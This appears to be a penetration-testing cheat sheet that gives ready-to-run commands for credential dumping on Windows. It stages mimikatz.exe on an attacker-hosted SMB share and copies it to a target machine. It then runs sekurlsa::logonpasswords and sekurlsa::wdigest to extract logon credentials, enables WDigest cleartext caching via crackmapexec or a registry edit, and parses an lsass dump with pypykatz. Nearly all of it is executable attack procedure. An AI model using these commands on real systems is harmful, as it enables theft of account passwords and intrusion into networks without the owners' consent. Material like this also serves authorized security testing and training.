# Mimikatz

## Mimikatz

Locate
```
$ locate mimikatz.exe
/usr/share/windows-resources/mimikatz/Win32/mimikatz.exe
/usr/share/windows-resources/mimikatz/x64/mimikatz.exe
```

Host mimikatz
```
cd /usr/share/windows-resources/mimikatz/
impacket-smbserver share $(pwd) -smb2support
```


Copy to Target - x86
```
xcopy \\<Kali IP>\share\Win32\mimikatz.exe C:\Temp\mimikatz\
```

Copy to Target - x64
```
xcopy \\<Kali IP>\share\x64\mimikatz.exe C:\Temp\mimikatz\
```


All available creds
```
cd C:\Temp\mimikatz\
C:\Temp\mimikatz\mimikatz.exe "privilege::debug" "log sekurlsa.log" "sekurlsa::logonpasswords" exit
```

Only `wdigest`
```
cd C:\Temp\mimikatz\
C:\Temp\mimikatz\mimikatz.exe "privilege::debug" "log sekurlsa.log" "sekurlsa::wdigest" exit
```

### Enabling wgigest

```
crackmapexec smb <Target_IP> -u '<username>' -p '<password>' -M wdigest -o ACTION=enable
```
OR
```
reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
```



## Pypykatz

Get secrets from memory dump
```
pypykatz lsa minidump --grep lsass.DMP
```


## Links

- [wdigest](https://www.hackingarticles.in/credential-dumping-wdigest/)
- [-wdigest-exploration](https://www.jimmwayans.com/mimikatz-exploration-wdigest/)